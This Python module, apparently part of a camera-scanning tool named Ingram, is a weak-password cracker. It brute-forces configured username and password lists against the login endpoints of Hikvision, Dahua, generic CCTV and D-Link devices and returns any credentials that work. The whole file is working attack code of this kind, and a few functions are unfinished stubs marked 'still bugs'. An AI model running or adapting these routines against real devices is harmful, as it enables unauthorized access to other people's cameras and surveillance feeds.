"""weak passwd crack for all device"""
import requests

from Ingram.utils import config
from Ingram.utils import logger


def hikvision_weak(ip: str) -> list:
    url = f"http://{ip}/ISAPI/Security/userCheck"
    headers = {'User-Agent': config['USERAGENT']}
    timeout = config['TIMEOUT']
    for user in config['USERS']:
        for passwd in config['PASSWDS']:
            try:
                r = requests.get(url, auth=(user, passwd), timeout=timeout, headers=headers, verify=False)
                if r.status_code == 200 and 'userCheck' in r.text and 'statusValue' in r.text and '200' in r.text:
                    return [True, str(user), str(passwd), 'weak-passwd']
            except Exception as e:
                logger.error(e)
    return [False, ]


def dahua_weak(ip: str) -> list:
    url = f"http://{ip}/RPC2_Login"
    timeout = config['TIMEOUT']
    headers = {
        'User-Agent': config['USERAGENT'],
        'Host': ip,
        'Origin': 'http://' + ip,
        'Referer': 'http://' + ip,
        'Accept': 'application/json, text/javascript, */*; q=0.01',
        'Accept-Language': 'zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2',
        'Accept-Encoding': 'gzip, deflate',
        'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
        'Connection': 'close',
        'X-Requested-With': 'XMLHttpRequest',
    }
    for user in config['USERS']:
        for passwd in config['PASSWDS']:
            _json = {
                "method": "global.login",
                "params": {
                    "userName": user,
                    "password": passwd,
                    "clientType": "Web3.0",
                    "loginType": "Direct",
                    "authorityType": "Default",
                    "passwordType": "Plain",
                },
                "id": 1,
                "session": 0,
            }
            try:
                r = requests.post(url, headers=headers, json=_json, verify=False, timeout=timeout)
                if r.status_code == 200 and r.json()['result'] == True:
                    return [True, str(user), str(passwd), 'weak-passwd']
            except Exception as e:
                logger.error(e)
    return [False, ]


def cctv_weak(ip: str) -> list:
    headers = {'User-Agent': config['USERAGENT']}
    timeout = config['TIMEOUT']
    for user in config['USERS']:
        for passwd in config['PASSWDS']:
            url = f'http://{ip}/cgi-bin/gw.cgi?xml=<juan ver="" squ="" dir="0"><rpermission usr="{user}" pwd="{passwd}"><config base=""/><playback base=""/></rpermission></juan>'
            try:
                r = requests.get(url, headers=headers, verify=False, timeout=timeout)
                if r.status_code == 200 and '<rpermission' in r.text:
                    items = r.text.split()
                    idx = items.index('<rpermission')
                    if '0' in items[idx + 1]:
                        return [True, str(user), str(passwd), 'weak pass']
            except Exception as e:
                logger.error(e)
    return [False, ]


# still bugs...
def uniview_weak(ip: str) -> list:
    headers = {'User-Agent': config['USERAGENT']}


# still bugs...
def dlink_weak(ip: str) -> list:
    headers = {'User-Agent': config['USERAGENT']}
    timeout = config['TIMEOUT']
    for user in config['USERS']:
        for p in config['PASSWDS']:
            r = requests.get(f"http://{ip}", verify=False, headers=headers, timeout=timeout, auth=(user, p))
            if r.status_code == 200 and 'D-Link' in r.text:
                return [True, str(user), str(p), 'weak pass']
    return [False, ]